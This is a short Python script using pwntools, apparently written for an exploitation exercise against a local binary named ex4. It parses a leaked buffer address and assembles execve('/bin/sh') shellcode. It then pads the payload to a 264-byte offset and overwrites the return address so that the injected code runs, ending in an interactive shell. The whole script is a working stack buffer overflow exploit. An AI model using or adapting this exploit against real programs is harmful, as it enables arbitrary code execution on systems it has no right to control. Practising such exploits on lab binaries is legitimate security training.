#!/usr/bin/env python3

from pwn import *

# you have to set this before using asm()
context.update(arch='amd64', os='linux')

target = process("./bin/ex4")


try:
    leak_line = target.recvline().decode()
    print(f"Program said: {leak_line.strip()}")
    
    # Adjust this split logic depending on exactly what the binary prints
    # Assuming the address is the last word in the line:
    buffer_address = int(leak_line.strip().split()[-1], 16)
    log.success(f"Leaked buffer address: {hex(buffer_address)}")
except Exception as e:
    log.error(f"Failed to parse leak: {e}")

# --- STEP 2: Craft the Manual Shellcode ---
# We chain the assembly instructions.
# Goal: execve("/bin/sh", 0, 0)

shellcode = asm("""
    xor rsi, rsi;
    xor rdx, rdx;
    mov rbx, 0x0068732f6e69622f;
    push rbx;
    mov rdi, rsp;
    push 59;
    pop rax;
    syscall;
""")


offset = 264
padding_len = offset - len(shellcode)

padding = b'A' * padding_len

ret_addr = p64(buffer_address)

payload =shellcode + padding + ret_addr


target.sendline(payload)
target.interactive()
